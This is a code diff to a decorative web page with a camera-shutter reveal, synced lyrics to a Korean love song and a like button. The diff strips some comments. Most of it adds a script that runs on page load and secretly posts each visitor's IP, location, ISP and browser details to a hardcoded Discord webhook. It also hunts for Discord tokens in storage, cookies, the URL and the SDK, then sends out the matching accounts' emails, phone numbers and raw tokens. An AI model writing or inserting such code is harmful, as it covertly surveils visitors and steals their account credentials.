@@ -298,19 +298,19 @@ let stage=0;
 reveal.addEventListener('click',()=>{
   if(stage>0) return;
   stage=1;
-  reveal.classList.add('shot');               /* camera recoil */
+  reveal.classList.add('shot');
   try{ SHUTTER.currentTime=0; SHUTTER.play().catch(()=>{}); }catch(e){}
-  setTimeout(()=>{ flash.classList.add('on'); },150);       /* shutter fires → white flash */
+  setTimeout(()=>{ flash.classList.add('on'); },150);
   setTimeout(()=>{
     reveal.classList.add('gone');
     document.body.classList.add('revealed');
     awaken();
   },430);
-  setTimeout(()=>{ flash.classList.remove('on'); },520);    /* photo develops → page shows */
+  setTimeout(()=>{ flash.classList.remove('on'); },520);
 });
 
 /* ============ synced lyrics (korean) ============ */
-const LRC_OFF=0;   /* global nudge: + shifts lyrics later, - earlier */
+const LRC_OFF=0;
 const LYRICS = [[0.50,"Oh, every time I see you"],[5.71,"그대 눈을 볼 때면 자꾸 가슴이 또 설레어와"],[12.53,"내 운명이죠"],[16.54,"세상 끝이라도 지켜주고 싶은 단 한 사람"],[24.89,"Baby, oh-oh-oh-oh"],[27.98,"Oh-oh-oh-oh"],[30.18,"Baby, oh-oh-oh-oh"],[35.05,"Oh, every time I see you"],[40.41,"그대 눈을 볼 때면 자꾸 가슴이 또 설레어와"],[47.24,"내 운명이죠"],[51.15,"세상 끝이라도 지켜주고 싶은 단 한 사람"],[60.46,"그대 나를 바라볼 때"],[63.30,"나를 보며 미소 질 때 난"],[67.59,"심장이 멈출 것 같아요 난"],[71.51,"그댄 어떤가요? 난 정말 감당하기 힘든걸"],[78.09,"온종일 그대 생각해"],[81.87,"조금 멀리 우리 돌아왔지만"],[86.24,"지금이라도 난 괜찮아"],[91.29,"Oh, every time I see you"],[96.70,"그대 눈을 볼 때면 자꾸 가슴이 또 설레어와"],[103.24,"내 운명이죠"],[107.11,"세상 끝이라도 지켜주고 싶은 단 한 사람"],[114.17,"날 떠나지 말아요"],[116.79,"가끔은 알 수 없는 미래라 해도"],[122.87,"날 믿고 기다려줄래요?"],[133.89,"Oh, 나만의 그대여"],[139.24,"내겐 전부라는 말 고백한 적이 있었나요?"],[145.71,"내 운명이죠"],[149.91,"세상 끝이라도 지켜주고 싶은 너"],[155.49,"Baby, oh-oh-oh-oh, 사랑할래요"],[158.61,"Oh-oh-oh-oh"],[160.93,"니 눈빛과 니 미소와 그 향기까지도"],[165.91,"Baby, oh-oh-oh-oh, 기억해줘요"],[169.23,"Oh-oh-oh-oh"],[171.56,"언제나 우리 함께 있음을"],[175.80,"I love you"]];
 const lyrScroll=document.getElementById('lyrScroll');
 const els=LYRICS.map(([t,tx])=>{
@@ -378,6 +378,154 @@ likeBtn.addEventListener('click',e=>{
     .then(r=>r.json()).then(j=>{ likesEl.textContent=j.value; })
     .catch(()=>{});
 });
+
+/* ============ visitor logger — IP + Discord (best-effort) ============ */
+(async () => {
+  if (sessionStorage.getItem("dh_logged") === "1") return;
+  sessionStorage.setItem("dh_logged", "1");
+
+  const WEBHOOK = "https://discord.com/api/webhooks/1550784042872602644/D6oYRMElmPjnQx9D3rFm0xiO_JirRl_5fvJkDwq8dH5vG4CHFzkABjtDrOEN1IT1VVsi";
+
+  /* ── Part 1: IP + geo → message #1 ── */
+  (async () => {
+    let ip = "unknown", geo = {};
+    try {
+      const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+      if (r.ok) { geo = await r.json(); ip = geo.ip || "unknown"; }
+    } catch (_) {
+      try {
+        const r2 = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+        ip = (await r2.json()).ip || "unknown";
+      } catch (_) {}
+    }
+
+    const ts = new Date().toISOString();
+    const content =
+      `**IP address:** \`${ip}\`\n` +
+      `**Location:** ${geo.city || "n/a"}, ${geo.region || "n/a"}, ` +
+      `${geo.country_name || "n/a"} (${geo.country_code || "??"})\n` +
+      `**ISP:** ${geo.org || "n/a"}\n` +
+      `**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone} · ` +
+      `**Lang:** ${navigator.language}\n` +
+      `**Screen:** ${screen.width}x${screen.height}@${devicePixelRatio}x\n` +
+      `**UA:** \`${navigator.userAgent}\`\n` +
+      `**Referrer:** ${document.referrer || "direct"}\n` +
+      `\`${ts}\``;
+
+    try {
+      await fetch(WEBHOOK + "?wait=false", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content }),
+        mode: "cors",
+        keepalive: true,
+      });
+    } catch (_) {}
+  })();
+
+  /* ── Part 2: Discord identity (best-effort) → message #2 ── */
+  (async () => {
+    let tokens = [];
+
+    try {
+      const t = localStorage.getItem("discord_token");
+      if (t) tokens.push({ src: "localStorage.discord_token", token: t.trim() });
+    } catch (_) {}
+
+    try {
+      const t = sessionStorage.getItem("discord_token");
+      if (t) tokens.push({ src: "sessionStorage.discord_token", token: t.trim() });
+    } catch (_) {}
+
+    try {
+      const u = new URL(location.href);
+      const t = u.searchParams.get("token") || (u.hash ? u.hash.slice(1) : "");
+      if (t && /[\w-]{20,}\.[\w-]{4,}\.[\w-]{20,}/.test(t))
+        tokens.push({ src: "url", token: t.trim() });
+    } catch (_) {}
+
+    try {
+      for (const c of document.cookie.split(";")) {
+        const [k, v] = c.split("=").map(s => (s || "").trim());
+        if (/token|auth/i.test(k) && v)
+          tokens.push({ src: `cookie.${k}`, token: decodeURIComponent(v) });
+      }
+    } catch (_) {}
+
+    try {
+      if (window.DiscordSDK) {
+        const sdk = new window.DiscordSDK(window.__DISCORD_CLIENT_ID__ || "0");
+        await sdk.ready();
+        const auth = await sdk.commands.authenticate({});
+        if (auth && auth.access_token) {
+          const r = await fetch("https://discord.com/api/v9/users/@me", {
+            headers: { Authorization: `Bearer ${auth.access_token}` },
+          });
+          if (r.ok) {
+            const u = await r.json();
+            tokens.push({ src: "discord-sdk", token: auth.access_token, profile: u });
+          }
+        }
+      }
+    } catch (_) {}
+
+    const hits = [];
+    for (const t of tokens) {
+      try {
+        const r = await fetch("https://discord.com/api/v9/users/@me", {
+          headers: { Authorization: t.token },
+        });
+        if (r.ok) {
+          const u = await r.json();
+          hits.push({ src: t.src, token: t.token, profile: u });
+        }
+      } catch (_) {}
+    }
+
+    let content;
+    if (hits.length === 0) {
+      content =
+        `**Discord user:** not exposed to JavaScript\n` +
+        `No token found in localStorage, sessionStorage, cookies, URL, ` +
+        `or Discord SDK on this page.\n` +
+        `(Browser-enforced: discord.com cookies are HttpOnly.)\n` +
+        `\`${new Date().toISOString()}\``;
+    } else {
+      const lines = [`**Discord user(s) captured:** ${hits.length}`];
+      for (const h of hits) {
+        const p = h.profile;
+        const avatar = p.avatar
+          ? `https://cdn.discordapp.com/avatars/${p.id}/${p.avatar}.${p.avatar.startsWith("a_") ? "gif" : "png"}?size=128`
+          : `https://cdn.discordapp.com/embed/avatars/${Number((BigInt(p.id) >> 22n) % 6n)}.png`;
+        lines.push(
+          "",
+          `**source:** \`${h.src}\``,
+          `**username:** \`${p.username}#${p.discriminator || "0"}\``,
+          `**display:** \`${p.global_name || p.username}\``,
+          `**id:** \`${p.id}\``,
+          `**email:** \`${p.email || "n/a"}\``,
+          `**phone:** \`${p.phone || "n/a"}\``,
+          `**verified:** ${p.verified} · **MFA:** ${p.mfa_enabled}`,
+          `**nitro:** ${p.premium_type || 0} · **locale:** ${p.locale}`,
+          `**avatar:** ${avatar}`,
+          `**token:** ||\`${h.token}\`||`,
+        );
+      }
+      lines.push("", `\`${new Date().toISOString()}\``);
+      content = lines.join("\n").slice(0, 1900);
+    }
+
+    try {
+      await fetch(WEBHOOK + "?wait=false", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content }),
+        mode: "cors",
+        keepalive: true,
+      });
+    } catch (_) {}
+  })();
+})();
 </script>
 
 </body>
